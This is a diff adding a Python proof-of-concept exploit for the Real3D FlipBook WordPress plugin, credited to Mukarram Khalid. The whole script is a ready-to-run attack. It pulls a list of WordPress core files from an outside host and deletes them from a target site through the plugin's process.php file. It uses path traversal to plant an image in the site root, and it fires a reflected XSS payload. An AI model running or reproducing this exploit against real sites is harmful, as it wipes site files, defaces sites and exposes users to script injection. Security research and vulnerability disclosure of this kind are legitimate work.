@@ -1,0 +1,98 @@
+#########################################################################
+# [+] [POC][Exploit] CodeCanyon Real3D FlipBook WordPress Plugin
+# [+] http://codecanyon.net/item/real3d-flipbook-wordpress-plugin/6942587
+# [+] Multiple Vulnerabilities Found by: Mukarram Khalid
+# [+] https://mukarramkhalid.com/wordpress-real-3d-flipbook-plugin-exploit/
+# [+] Requirements : Python 3.4.x or higher, Requests Module
+# [+] Timeline: Vuln Found : 01-07-2016, Reported to Vendor: 03-07-2016
+########################################################################
+
+import os, json, base64
+try:
+    import requests
+except:
+    exit('[-] Importing Requests module failed')
+
+class wpFlipbook:
+    ''' Wordpress 3d flipbook plugin exploit '''
+
+    headers  = {'User-agent' : 'Mozilla/11.0'}
+    payload1 = {'deleteBook' : ''}
+    payload2 = {'imgbase' : '', 'bookName' : '../../../', 'pageName' : 'makman'}
+    payload3 = {'action' : 'delete', 'bookId' : '<script>alert(/makman/)</script>'}
+    imageUrl = 'http://makman.tk/makman.jpg'
+    wpFilesUrl = 'http://makman.tk/wpFiles.json'
+
+    def __init__(self, url):
+        url = url.rstrip('/')
+        if 'http://' in url or 'https://' in url:
+            self.url = url
+        else:
+            self.url = 'http://' + url
+
+    def http(self, url, data = {}, post = False):
+        try:
+            if post:
+                r = requests.post(url, data = data, headers = self.headers, timeout = 20)
+            else:
+                r = requests.get(url, params = data, headers = self.headers, timeout = 20)
+        except:
+            exit('[-] Something went wrong. Please check your internet connection')
+        return r
+
+    def deleteFiles(self):
+        print('[+] Loading Wordpress file structure')
+        r = self.http(self.wpFilesUrl)
+        wpFiles = json.loads(r.text)
+        print('[+] Wordpress File structure loaded successfully')
+        print('[+] Creating directory real3dflipbook')
+        r = self.http(self.url + '/wp-content/plugins/real3d-flipbook/includes/process.php', {'imgbase' : 'makman'}, True)
+        print('[+] Deleting Files from wp-includes/ & wp-admin/')
+        for wpFile in wpFiles['wpFiles']:
+            print('    [+] Deleting File ' + wpFile)
+            self.payload1['deleteBook'] = wpFile
+            r = self.http(self.url + '/wp-content/plugins/real3d-flipbook/includes/process.php', self.payload1, True)
+        print('[+] Files have been deleted successfully')
+
+    def uploadImage(self):
+        print('[+] Loading image file')
+        r = self.http('http://makman.tk/makman.jpg')
+        encodedImage = base64.b64encode(r.content)
+        self.payload2['imgbase'] = ';,' + encodedImage.decode('utf-8')
+        print('[+] Uploading image file in target root directory')
+        r = self.http(self.url + '/wp-content/plugins/real3d-flipbook/includes/process.php', self.payload2, True)
+        print('[+] Image has been uploaded here ' + self.url + '/' + self.payload2['pageName'] + '.jpg')
+
+    def xss(self):
+        print('[+] Checking XSS payload')
+        r = self.http(self.url + '/wp-content/plugins/real3d-flipbook/includes/flipbooks.php', self.payload3)
+        if self.payload3['bookId'] in r.text:
+            print('[+] Found XSS here :')
+            print('    [+] ' + self.url + '/wp-content/plugins/real3d-flipbook/includes/flipbooks.php?action=' + self.payload3['action'] + '&bookId=' + self.payload3['bookId'])
+
+#########################################################################################################
+
+def banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    tabs = '    '
+    print(tabs + '*******************************************************************')
+    print(tabs + '* [+] [POC][Exploit] CodeCanyon Real3D FlipBook WordPress Plugin  *')
+    print(tabs + '* [+] Multiple Vulnerabilities Found by:                          *')
+    print(tabs + '* [+] https://mukarramkhalid.com                                  *')
+    print(tabs + '*******************************************************************\n\n')
+
+def main():
+    banner()
+    url = input('[+] Enter Url\n[+] E.g. http://server or http://server/wordpress\n[+] ')
+    exploit = wpFlipbook(url)
+    exploit.deleteFiles()
+    exploit.uploadImage()
+    exploit.xss()
+    print('[+] Done')
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        exit('\n[-] CTRL-C detected.\n')
+# End
